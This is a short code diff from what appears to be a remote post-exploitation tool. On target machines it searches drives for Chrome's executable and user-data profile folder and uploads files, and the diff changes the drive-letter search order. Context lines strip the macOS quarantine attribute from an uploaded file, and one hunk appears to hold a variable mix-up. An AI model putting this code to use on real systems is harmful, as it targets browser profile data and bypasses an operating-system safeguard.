@@ -87,7 +87,7 @@ async function findUserDataDir(session: Session, interact: InteractiveSession): 
       }
       break
     case 'windows':
-      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+      const characters = 'CDEFGHIJKLMNOPQRSTUVWXYZAB';
       for (let index = 0; index < characters.length; ++index) {
         userDataPath = '[DRIVE]:\\Users\\[USERNAME]\\AppData\\Local\\Google\\Chrome\\User Data'
         userDataPath = userDataPath.replace('[DRIVE]', characters.charAt(index))
@@ -107,7 +107,7 @@ async function getChromePath(session: Session, interact: InteractiveSession): Pr
     case 'darwin':
       return CHROME_MACOS_PATH
     case 'windows':
-      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+      const characters = 'CDEFGHIJKLMNOPQRSTUVWXYZAB';
       for (let currentPath of CHROME_WINDOWS_PATHS) {
         for (let index = 0; index < characters.length; ++index) {
           let path = currentPath
@@ -250,7 +250,7 @@ if (fs.existsSync(args.config)) {
         await interact.execute('xattr', ['-r', '-d', 'com.apple.quarantine', upload.getPath()], true)   
         break
       case 'windows':
-        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        const characters = 'CDEFGHIJKLMNOPQRSTUVWXYZAB';
         for (let index = 0; index < characters.length; ++index) {
           let uploadPath = "[DRIVE]:\\Windows\\Temp"
           userDataPath = userDataPath.replace('[DRIVE]', characters.charAt(index))
